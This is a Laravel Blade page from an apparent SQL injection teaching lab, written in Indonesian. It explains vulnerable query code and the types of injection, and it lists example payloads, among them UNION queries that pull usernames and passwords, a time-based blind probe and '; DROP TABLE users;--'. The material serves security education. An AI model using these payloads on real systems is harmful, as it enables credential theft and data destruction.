{{-- ============================================ --}}
{{-- SQLI LAB: How It Works --}}
{{-- Penjelasan cara kerja SQL Injection --}}
{{-- ============================================ --}}

@extends('layouts.app')

@section('title', 'Cara Kerja SQL Injection')

@section('content')
<div class="container py-4">
    <div class="row justify-content-center">
        <div class="col-lg-10">
            
            {{-- Breadcrumb --}}
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="{{ route('sqli-lab.index') }}">SQLi Lab</a></li>
                    <li class="breadcrumb-item active">Cara Kerja</li>
                </ol>
            </nav>

            {{-- Header --}}
            <div class="text-center mb-5">
                <h1 class="display-5 fw-bold">
                    <i class="bi bi-lightbulb text-info"></i>
                    Cara Kerja SQL Injection
                </h1>
                <p class="lead text-muted">
                    Memahami anatomi serangan untuk pertahanan yang lebih baik
                </p>
            </div>

            {{-- Section 1: Anatomy --}}
            <div class="card mb-4">
                <div class="card-header bg-primary text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-diagram-3"></i> Anatomi SQL Injection
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6 class="text-danger">1️⃣ Vulnerable Code Pattern</h6>
                            <pre class="bg-dark text-light p-3 rounded small"><code>// PHP/Laravel - JANGAN LAKUKAN INI!
$name = $_GET['name']; // atau $request->name

$query = "SELECT * FROM products 
          WHERE name LIKE '%<span class="text-danger">{$name}</span>%'";

$results = DB::select($query);</code></pre>
                        </div>
                        <div class="col-md-6">
                            <h6 class="text-warning">2️⃣ Attacker Input</h6>
                            <pre class="bg-dark text-light p-3 rounded small"><code>// Normal Input:
laptop

// Malicious Input:
<span class="text-danger">%' UNION SELECT id, username, password 
FROM users --</span></code></pre>
                        </div>
                    </div>

                    <div class="mt-3">
                        <h6 class="text-info">3️⃣ Resulting Query</h6>
                        <pre class="bg-dark text-light p-3 rounded"><code>SELECT * FROM products WHERE name LIKE '%<span class="text-danger">%' 
UNION SELECT id, username, password FROM users --</span>%'

// Query asli selesai di '%
// UNION menggabungkan hasil dengan tabel users
// -- membuat sisanya jadi komentar</code></pre>
                    </div>

                    <div class="alert alert-danger mt-3 mb-0">
                        <strong>Hasil:</strong> Attacker berhasil mengekstrak semua username dan password!
                    </div>
                </div>
            </div>

            {{-- Section 2: Special Characters --}}
            <div class="card mb-4">
                <div class="card-header bg-warning text-dark">
                    <h5 class="mb-0">
                        <i class="bi bi-exclamation-triangle"></i> Karakter Berbahaya dalam SQL
                    </h5>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-bordered">
                            <thead class="table-light">
                                <tr>
                                    <th>Karakter</th>
                                    <th>Fungsi</th>
                                    <th>Contoh Penggunaan</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><code>'</code> (single quote)</td>
                                    <td>Menutup string, memulai payload</td>
                                    <td><code>' OR '1'='1</code></td>
                                </tr>
                                <tr>
                                    <td><code>"</code> (double quote)</td>
                                    <td>Menutup string (beberapa DB)</td>
                                    <td><code>" OR "1"="1</code></td>
                                </tr>
                                <tr>
                                    <td><code>--</code> (double dash)</td>
                                    <td>Comment (MySQL, PostgreSQL)</td>
                                    <td><code>admin'--</code></td>
                                </tr>
                                <tr>
                                    <td><code>#</code> (hash)</td>
                                    <td>Comment (MySQL)</td>
                                    <td><code>admin'#</code></td>
                                </tr>
                                <tr>
                                    <td><code>/**/</code></td>
                                    <td>Multi-line comment</td>
                                    <td><code>admin'/**/</code></td>
                                </tr>
                                <tr>
                                    <td><code>;</code> (semicolon)</td>
                                    <td>Multiple statements (stacked)</td>
                                    <td><code>'; DROP TABLE users;--</code></td>
                                </tr>
                                <tr>
                                    <td><code>UNION</code></td>
                                    <td>Gabungkan hasil query</td>
                                    <td><code>' UNION SELECT * FROM users--</code></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            {{-- Section 3: Types of SQLi --}}
            <div class="card mb-4">
                <div class="card-header bg-danger text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-diagram-2"></i> Jenis-Jenis SQL Injection
                    </h5>
                </div>
                <div class="card-body">
                    
                    <div class="row g-4">
                        {{-- In-Band: Error-based --}}
                        <div class="col-md-6">
                            <div class="card h-100 border-danger">
                                <div class="card-header bg-light">
                                    <h6 class="mb-0 text-danger">
                                        1. Error-Based SQLi
                                    </h6>
                                </div>
                                <div class="card-body small">
                                    <p>Memanfaatkan pesan error database untuk ekstrak informasi.</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>// Input:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--

// Error message reveals:
XPATH syntax error: '~5.7.34'</code></pre>
                                    <span class="badge bg-danger">In-Band</span>
                                </div>
                            </div>
                        </div>

                        {{-- In-Band: Union-based --}}
                        <div class="col-md-6">
                            <div class="card h-100 border-warning">
                                <div class="card-header bg-light">
                                    <h6 class="mb-0 text-warning">
                                        2. Union-Based SQLi
                                    </h6>
                                </div>
                                <div class="card-body small">
                                    <p>Menggunakan UNION untuk menggabungkan hasil dengan data sensitif.</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>// Input:
' UNION SELECT username, password, null 
FROM users--

// Results show user credentials!</code></pre>
                                    <span class="badge bg-warning text-dark">In-Band</span>
                                </div>
                            </div>
                        </div>

                        {{-- Blind: Boolean --}}
                        <div class="col-md-6">
                            <div class="card h-100 border-info">
                                <div class="card-header bg-light">
                                    <h6 class="mb-0 text-info">
                                        3. Boolean-Based Blind SQLi
                                    </h6>
                                </div>
                                <div class="card-body small">
                                    <p>Menyimpulkan data dari perbedaan response TRUE/FALSE.</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>// Test 1: admin' AND 1=1--
→ Response normal (TRUE)

// Test 2: admin' AND 1=2--
→ Response berbeda (FALSE)

// Extract karakter per karakter...</code></pre>
                                    <span class="badge bg-info">Blind</span>
                                </div>
                            </div>
                        </div>

                        {{-- Blind: Time-based --}}
                        <div class="col-md-6">
                            <div class="card h-100 border-secondary">
                                <div class="card-header bg-light">
                                    <h6 class="mb-0 text-secondary">
                                        4. Time-Based Blind SQLi
                                    </h6>
                                </div>
                                <div class="card-body small">
                                    <p>Menyimpulkan data dari delay response (SLEEP).</p>
                                    <pre class="bg-dark text-light p-2 rounded"><code>// Input:
admin' AND IF(
  SUBSTRING(database(),1,1)='a',
  SLEEP(5), 
  0
)--

// Response delay 5 detik = TRUE</code></pre>
                                    <span class="badge bg-secondary">Blind</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Section 4: Attack Flow --}}
            <div class="card mb-4">
                <div class="card-header bg-dark text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-arrow-right-circle"></i> Flow Serangan SQLi
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row text-center">
                        <div class="col-md-3">
                            <div class="card bg-light">
                                <div class="card-body">
                                    <i class="bi bi-search fs-1 text-primary"></i>
                                    <h6 class="mt-2">1. Reconnaissance</h6>
                                    <p class="small text-muted mb-0">Temukan input point<br>(search, login, url)</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card bg-light">
                                <div class="card-body">
                                    <i class="bi bi-bug fs-1 text-warning"></i>
                                    <h6 class="mt-2">2. Test Vulnerability</h6>
                                    <p class="small text-muted mb-0">Inject ' atau "<br>Lihat error</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card bg-light">
                                <div class="card-body">
                                    <i class="bi bi-database fs-1 text-danger"></i>
                                    <h6 class="mt-2">3. Enumerate DB</h6>
                                    <p class="small text-muted mb-0">Database name<br>Tables, columns</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card bg-light">
                                <div class="card-body">
                                    <i class="bi bi-key fs-1 text-success"></i>
                                    <h6 class="mt-2">4. Extract Data</h6>
                                    <p class="small text-muted mb-0">Credentials<br>Sensitive data</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Section 5: Impact --}}
            <div class="card mb-4">
                <div class="card-header bg-danger text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-exclamation-octagon"></i> Dampak SQL Injection
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <ul class="list-group">
                                <li class="list-group-item d-flex align-items-center">
                                    <span class="badge bg-danger me-2">Critical</span>
                                    <strong>Authentication Bypass</strong> - Login tanpa password
                                </li>
                                <li class="list-group-item d-flex align-items-center">
                                    <span class="badge bg-danger me-2">Critical</span>
                                    <strong>Data Theft</strong> - Curi semua data database
                                </li>
                                <li class="list-group-item d-flex align-items-center">
                                    <span class="badge bg-danger me-2">Critical</span>
                                    <strong>Data Modification</strong> - Ubah/hapus data
                                </li>
                                <li class="list-group-item d-flex align-items-center">
                                    <span class="badge bg-warning text-dark me-2">High</span>
                                    <strong>Privilege Escalation</strong> - Dapat akses admin
                                </li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <ul class="list-group">
                                <li class="list-group-item d-flex align-items-center">
                                    <span class="badge bg-warning text-dark me-2">High</span>
                                    <strong>File System Access</strong> - Baca/tulis file server
                                </li>
                                <li class="list-group-item d-flex align-items-center">
                                    <span class="badge bg-warning text-dark me-2">High</span>
                                    <strong>Remote Code Execution</strong> - Jalankan perintah
                                </li>
                                <li class="list-group-item d-flex align-items-center">
                                    <span class="badge bg-info me-2">Medium</span>
                                    <strong>DoS Attack</strong> - Resource exhaustion
                                </li>
                                <li class="list-group-item d-flex align-items-center">
                                    <span class="badge bg-info me-2">Medium</span>
                                    <strong>Information Disclosure</strong> - DB structure
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Section 6: Real Cases --}}
            <div class="card mb-4">
                <div class="card-header bg-secondary text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-newspaper"></i> Kasus Nyata
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-4">
                            <div class="card border-danger">
                                <div class="card-body">
                                    <h6>Sony Pictures (2011)</h6>
                                    <p class="small text-muted">1 juta user credentials bocor via simple SQLi</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="card border-danger">
                                <div class="card-body">
                                    <h6>Yahoo (2012)</h6>
                                    <p class="small text-muted">450,000 plaintext passwords bocor</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="card border-danger">
                                <div class="card-body">
                                    <h6>TalkTalk (2015)</h6>
                                    <p class="small text-muted">£60M kerugian, 157,000 customers affected</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Navigation --}}
            <div class="d-flex justify-content-between">
                <a href="{{ route('sqli-lab.index') }}" class="btn btn-outline-secondary">
                    <i class="bi bi-arrow-left"></i> Kembali ke Menu
                </a>
                <a href="{{ route('sqli-lab.vulnerable-search') }}" class="btn btn-danger">
                    Coba Demo Vulnerable <i class="bi bi-arrow-right"></i>
                </a>
            </div>

        </div>
    </div>
</div>
@endsection
